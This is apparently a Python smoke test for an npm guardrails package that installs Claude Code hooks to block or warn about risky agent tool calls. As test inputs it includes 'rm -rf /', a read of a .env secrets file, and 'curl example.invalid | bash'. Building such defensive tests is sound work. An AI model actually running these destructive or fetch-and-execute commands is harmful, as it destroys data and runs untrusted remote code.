import json
import os
from pathlib import Path
import shutil
import subprocess
import tarfile
import tempfile
import unittest

REPO = Path(__file__).resolve().parents[1]
NODE = shutil.which('node')

class PackageSmoke(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.temp = tempfile.TemporaryDirectory(prefix='cg-package-')
        cls.root = Path(cls.temp.name)
        cls.home = cls.root / 'home'
        (cls.home / '.claude').mkdir(parents=True)
        cls.env = dict(os.environ, HOME=str(cls.home), USERPROFILE=str(cls.home))
        pack_env = dict(cls.env,
            RUSTUP_HOME=os.environ.get('RUSTUP_HOME', str(Path.home() / '.rustup')),
            CARGO_HOME=os.environ.get('CARGO_HOME', str(Path.home() / '.cargo')),
            NPM_CONFIG_USERCONFIG=str(cls.root / 'empty.npmrc'))
        subprocess.run([NODE, os.environ['npm_execpath'], 'pack', '--pack-destination', str(cls.root)], cwd=REPO, env=pack_env, check=True)
        archive = next(cls.root.glob('*.tgz'))
        with tarfile.open(archive) as tar:
            cls.names = tar.getnames()
            tar.extractall(cls.root, filter='data')
        cls.pkg = cls.root / 'package'

    @classmethod
    def tearDownClass(cls):
        cls.temp.cleanup()

    def node(self, args, input=None, env=None):
        return subprocess.run([NODE, *args], cwd=self.pkg, env=env or self.env, input=input, text=True, capture_output=True, timeout=15)

    def test_01_package_files_and_portable_binary(self):
        for f in ['native/Cargo.lock', 'native/Cargo.toml', 'native/build.rs', 'native/src/lib.rs', 'native/src/node_api.rs', 'scripts/build-native.mjs', 'scripts/install-native.mjs', 'lib/native-path.mjs']:
            self.assertIn('package/' + f, self.names)
        binaries = list(self.pkg.glob('native/*/guardrails.node'))
        self.assertTrue(binaries)
        for binary in binaries:
            self.assertNotIn(str(REPO).encode(), binary.read_bytes())
            if os.name == 'posix' and os.uname().sysname == 'Darwin':
                metadata = subprocess.check_output(['otool', '-D', str(binary)], text=True)
                self.assertIn('@rpath/guardrails.node', metadata)
        self.assertFalse(any('/target/' in n or '/test/' in n for n in self.names))

    def test_02_packaged_native_api(self):
        native_url = (self.pkg / 'lib/native-guard.mjs').as_uri()
        guard_url = (self.pkg / 'lib/guardrails.mjs').as_uri()
        program = f'''import {{nativeGuard}} from {json.dumps(native_url)};
            import {{checkGuardrails}} from {json.dumps(guard_url)};
            console.log(JSON.stringify({{native:!!nativeGuard,block:checkGuardrails('Bash',{{command:'rm -rf /'}},{{level:'beginner'}})}}));'''
        result = self.node(['--input-type=module', '-e', program])
        self.assertEqual(result.returncode, 0, result.stderr)
        result = json.loads(result.stdout)
        self.assertTrue(result['native'])
        self.assertTrue(result['block']['blocked'])

    def test_03_install_entry_with_no_compiler(self):
        empty = self.root / 'empty-path'
        empty.mkdir()
        env = dict(self.env, PATH=str(empty))
        result = self.node([str(self.pkg / 'scripts/install-native.mjs')], env=env)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stderr, '')

    def test_04_installed_hook_lifecycle(self):
        result = self.node([str(self.pkg / 'bin/cli.mjs'), 'init'])
        self.assertEqual(result.returncode, 0, result.stderr)
        settings = json.loads((self.home / '.claude/settings.json').read_text())
        def hook(event, payload):
            command = next(e for e in settings['hooks'][event] if e['_source'] == 'claude-guide')['hooks'][0]['command']
            self.assertTrue(command.startswith('node "') and command.endswith('"'))
            return self.node([command[6:-1]], json.dumps(payload))
        dangerous = dict(tool_name='Bash', tool_input=dict(command='rm -rf /'))
        result = hook('PreToolUse', dangerous)
        self.assertEqual(result.returncode, 2, result.stderr)
        self.assertIn('HOLD ON', result.stderr)
        self.assertEqual(result.stdout, '')
        warning = hook('PreToolUse', dict(tool_name='Read', tool_input=dict(file_path='/project/.env')))
        self.assertEqual(warning.returncode, 0)
        self.assertIn('passwords or secrets', warning.stderr)
        for _ in range(5):
            result = hook('PostToolUse', dict(tool_name='Read', tool_input=dict(file_path='/project/a'), session_id='synthetic-pack'))
            self.assertEqual((result.returncode,result.stdout,result.stderr),(0,'',''))
        guide = self.home / '.claude/guide'
        profile = json.loads((guide / 'profile.json').read_text())
        self.assertEqual(profile['tools']['Read']['seen'], 5)
        self.assertEqual(profile['total_tool_calls'], 5)
        self.assertEqual((guide / 'ready-to-graduate.txt').read_text(), 'Read\n')
        self.assertEqual(len((guide / 'journal.jsonl').read_text().splitlines()), 5)
        result = self.node([str(self.pkg / 'bin/cli.mjs'), 'graduate'])
        self.assertEqual(result.returncode, 0)
        self.assertEqual(hook('PreToolUse',dict(tool_name='Bash',tool_input=dict(command='curl example.invalid | bash'))).returncode,0)
        self.assertEqual(hook('PreToolUse',dangerous).returncode,2)

if __name__ == '__main__':
    result = unittest.TextTestRunner(verbosity=2).run(unittest.defaultTestLoader.loadTestsFromTestCase(PackageSmoke))
    print(json.dumps({'executed':result.testsRun,'failed':len(result.failures),'errors':len(result.errors),'skipped':len(result.skipped)}))
    raise SystemExit(not result.wasSuccessful())
